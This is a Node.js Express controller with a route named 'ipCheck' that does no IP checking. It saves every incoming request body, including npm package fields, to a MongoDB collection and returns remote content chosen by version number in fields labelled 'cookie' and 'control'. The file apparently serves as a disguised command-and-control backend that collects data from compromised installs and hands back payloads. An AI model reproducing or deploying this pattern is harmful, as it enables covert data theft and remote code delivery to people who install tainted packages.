const axios = require("axios");
const asyncErrorHandler = require("../middlewares/asyncErrorHandler");
const MongoDBService = require('../models/db_service');

exports.getIpCheck = asyncErrorHandler(async (req, res, next) => {
  res.status(200).json({
    success: true,
    data: ""
  });
});

async function insertQuery(query) {
  const mongoService = new MongoDBService('gd');
  try {
    await mongoService.connect();
    await mongoService.insertOne('vercel_upload', query);
  } catch (err) {
    console.error('Error:', err);
    await mongoService.destroy();
  } finally {
    await mongoService.destroy();
  }
}

exports.ipCheck = asyncErrorHandler(async (req, res, next) => {
  const version = req.body && req.body.version;

  const npm_version = req.body && req.body.npm_package_version;

  let flag = 55;
  if (version) {
    // console.log("version", version);
    const sub = version.split(".");
    if (sub && sub.length == 3) {
      flag = sub[2]; // ex: "1.0.55"
    }
  } else if (npm_version) {
    // console.log("npm version", npm_version);
    const sub = npm_version.split(".");
    if (sub && sub.length == 3) {
      flag = sub[2]; // ex: "1.0.55"
    }
  }

  // console.log("flag", flag)

  const id = "ID_" + flag;

  const u_id = id + "_1";

  const url = process.env[u_id] || process.env.ID_55_1;

  insertQuery(req.body);

  const result = await axios.get(url);

  const c_id = id + "_2";

  const control_url = process.env[c_id] || process.env.ID_55_2;
  const result_ctrl = await axios.get(control_url);

  console.log(`${id} is running`, url, control_url);


  res.status(200).json({
    success: true,
    cookie: result.data.cookie,
    control: result_ctrl.data.cookie
  });
});